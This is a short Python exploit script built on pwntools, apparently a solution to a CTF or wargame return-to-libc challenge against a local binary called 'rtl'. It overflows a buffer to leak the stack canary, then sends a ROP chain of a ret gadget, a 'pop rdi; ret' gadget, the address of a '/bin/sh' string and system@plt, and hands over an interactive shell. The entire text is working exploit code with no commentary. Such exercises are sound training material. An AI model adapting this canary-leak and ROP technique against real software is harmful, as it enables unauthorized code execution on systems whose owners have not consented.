from pwn import *

p = process('./rtl')
e = ELF('./rtl')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

buf = b'a'*0x39
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recv(7))

slog('cnry', cnry)

ret = 0x400285
pop_rdi_ret = 0x400853
binsh = 0x400874
system_plt = e.plt['system']

payload = b'a'*0x38 + p64(cnry) + b'b'*0x8
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system_plt)

p.sendlineafter(b"Buf: ", payload)

p.interactive()